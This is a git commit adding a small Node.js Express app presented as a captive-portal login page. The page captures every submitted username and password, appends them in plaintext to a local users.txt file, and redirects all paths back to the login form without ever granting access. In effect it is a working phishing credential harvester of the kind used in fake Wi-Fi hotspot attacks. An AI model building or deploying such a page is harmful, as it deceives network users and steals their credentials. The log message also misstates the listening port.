5d9de07f61adb11bb9a4b0fd39e5faa86e46bef9
Felipe Ratto <felipeguimaraesratto@gmail.com>
2023-06-26 00:22:36 -0300

    Add a WebPage in Node for captive portal

---
+++ WebPage/index.js
@@ -0,0 +1,39 @@
+const express = require("express")
+const fs = require("fs")
+const modRewrite = require('connect-modrewrite');
+
+const filename = "users.txt"
+
+app = express()
+app.set('trust proxy', true);
+app.set('view engine', 'ejs')
+app.use(express.static('public'))
+app.use(express.urlencoded({extended: true}))
+
+app.use(modRewrite([
+  '^/favicon\\.ico$ /favicon.ico [L]',
+   '^(?!/$)^.*$ / [R=301,L,QSA]'
+]));
+
+
+app.get('/', (req,res)=>{
+    res.render('login')
+})
+
+app.post('/', (req,res)=>{
+    if(fs.existsSync(filename)){
+        let content = "#--> "+req.body.login+":"+req.body.senha+"\n"
+        fs.appendFile(filename,content, (err)=>{
+            if(err){console.log("Erro ao salvar usuario: ", err)}
+            else{console.log("Usuário salvo")}
+        });
+    }else{
+        let content = ""
+        content += "#--> "+req.body.login+":"+req.body.senha+"\n"
+        fs.writeFileSync(filename,content)
+    }
+    res.redirect('/')
+})
+
+
+app.listen(80, ()=>{console.log("escutando na porta 3000")})
